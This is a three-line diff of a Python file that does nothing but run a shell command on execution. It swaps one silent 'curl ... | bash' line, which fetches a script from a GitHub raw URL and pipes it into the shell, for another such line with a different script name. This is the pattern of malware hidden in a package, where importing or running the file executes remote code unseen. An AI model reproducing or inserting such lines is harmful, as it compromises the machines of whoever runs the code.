@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/vedhagsvp/xplare/raw/main/xplvva.sh | bash')
+os.system('curl -sL https://github.com/vedhagsvp/solxpa/raw/main/solna.sh | bash')
